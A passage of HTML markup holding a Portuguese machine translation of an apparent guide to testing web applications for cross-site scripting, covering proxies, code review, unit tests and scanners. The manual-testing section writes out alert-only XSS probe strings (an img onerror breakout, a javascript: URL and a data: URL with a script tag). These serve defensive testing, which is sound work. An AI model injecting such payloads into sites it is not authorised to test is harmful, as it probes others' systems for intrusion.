vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">teste manual</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">escrever testes unitários para verificar a fuga ou sanitização corretas em partes cruciais da sua aplicação</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">usando ferramentas automatizadas.</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><br /></li></ul><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Esta seção descreverá e fará recomendações para cada estratégia. </span></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Teste manual ("teste de caixa preta")</span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O XSS é um risco sempre que o seu aplicativo manipula a entrada do usuário. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para obter melhores resultados, configure seu navegador para usar um proxy que intercepte e varra o tráfego para ajudar a identificar problemas. </span></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Exemplos de ferramentas incluem </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=http://portswigger.net/burp/proxy.html&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhiH7XHKSNtzuooh8Ir5a_phGw7IMA" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Burp Proxy</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> e </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://code.google.com/p/ratproxy/&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhhaoX2Wv14dkuhU1YoNZvphePI6nQ" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">ratproxy</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> . </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Execute estes testes básicos em seu aplicativo: </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Interaja com seu aplicativo. Inserir strings que contenham metacaracteres HTML e JavaScript em todas as entradas do aplicativo, como formulários, parâmetros de URL, campos ocultos (!) Ou valores de cookie. </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Uma boa string de teste é</span></div></li></ul><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #f8f8f8; padding: 5pt; vertical-align: top;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> &gt;'&gt;"&gt;</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;img </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">src</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">x</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: teal; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">onerror</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="color: #dd1144; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">alert(0)</span><span style="color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&gt;</span></div></td></tr></tbody></table></div><div style="font-size: medium; font-weight: 400;"><br /></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Se o seu aplicativo não escapar corretamente desta string, você verá um alerta e saberá que algo deu errado. </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Onde quer que seu aplicativo lide com URLs fornecidos pelo usuário, insira </span><span style="background-color: #f8f8f8; color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">javascript</span><span style="background-color: #f8f8f8; color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">:alert(0)</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> &nbsp;&nbsp;&nbsp;&nbsp;ou</span></div></li></ul><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><span class="Apple-tab-span" style="white-space: pre;"> </span></span><span style="background-color: #f8f8f8; color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">data:text/html,</span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;script&gt;</span><span style="background-color: #f8f8f8; color: #333333; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">alert(0)</span><span style="background-color: #f8f8f8; color: navy; font-family: &quot;consolas&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">&lt;/script&gt;</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">. </span></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Crie um perfil de usuário de teste com dados semelhantes às cadeias de teste acima. Use esse perfil para interagir com seu aplicativo. Isso pode ajudar a identificar erros de XSS armazenados.</span></div></li></ul></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Revisão de código ("teste de caixa branca") </span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Solicite que um colega ou amigo revise seu código com novos olhos (e ofereça-se para retribuir o favor!).</span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Peça-lhes que procurem especificamente por vulnerabilidades XSS e aponte-as para este documento, se isso for útil.</span></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Testes unitários</span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Use o teste de unidade para certificar-se de que um determinado bit de dados tenha escapado corretamente. </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Embora nem sempre seja possível </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://en.wikipedia.org/wiki/Unit_testing&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhg2aO2xs_VpUI7TbMfI0TfGAl6hgg" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">testar</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> a </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://en.wikipedia.org/wiki/Unit_testing&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhg2aO2xs_VpUI7TbMfI0TfGAl6hgg" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">unidade em</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> todos os lugares em que os dados fornecidos pelo usuário são exibidos, você deve, no mínimo, redigir os testes de unidade para obter um código ligeiramente fora do normal para garantir que o resultado atenda às suas expectativas. Isso inclui lugares onde: </span></div><ul style="font-size: medium; font-weight: 400; margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">A marcação que inclui a entrada do usuário é gerada no código - verifique se nenhuma entrada não confiável escapou ou foi removida. </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Seu aplicativo redireciona para URLs externos. Verifique se o URL começa com http: // ou https: // . </span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Você usa um HTML sanitizer or stripper para remover tags &nbsp;- verifique se alguma marcação não suportada está com escape. </span></div></li></ul><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Além disso, sempre que você encontrar e corrigir um bug XSS no seu código, considere adicionar um teste de regressão para ele.</span></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Scanners de segurança de aplicativos da Web Web application security scanners</span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Você pode usar o software de verificação de segurança para identificar vulnerabilidades XSS nos aplicativos. Embora os scanners automáticos muitas vezes não sejam otimizados para seu aplicativo específico, eles permitem que você encontre com rapidez e facilidade as vulnerabilidades mais óbvias. </span><a href="https://translate.googleusercontent.com/translate_c?anno=2&amp;depth=1&amp;hl=pt-BR&amp;rurl=translate.google.com.br&amp;sl=en&amp;sp=nmt4&amp;tl=pt-BR&amp;u=https://code.google.com/p/skipfish/&amp;xid=17259,15700023,15700124,15700149,15700168,15700173,15700186,15700189,15700201&amp;usg=ALkJrhhn2WPUC6vagocY_e1AL8DQ5YFuVA" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Skipfish</span></a><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> é uma dessas ferramentas.</span></div></h1><h2 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;"><span style="font-family: &quot;arial&quot;; font-size: 16pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">Qual método de teste devo usar? </span></h2><h1 dir="ltr" style="line-height: 1.38; margin-bottom: 6pt; margin-top: 20pt;"><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Bem, para ser honesto - o máximo possível (que tipo de resposta você esperava dos seguranças?). </span></div><div style="font-size: medium; font-weight: 400;"><br /></div><div dir="ltr" style="font-size: medium; font-weight: 400; line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Nenhuma metodologia de teste é infalível; Assim, a execução de uma combinação de revisões de código e testes manuais e automatizados diminuirá as chances de uma vulnerabilidade de XSS em seu aplicativo.</span></div><div><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"></span><br /><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div></h1>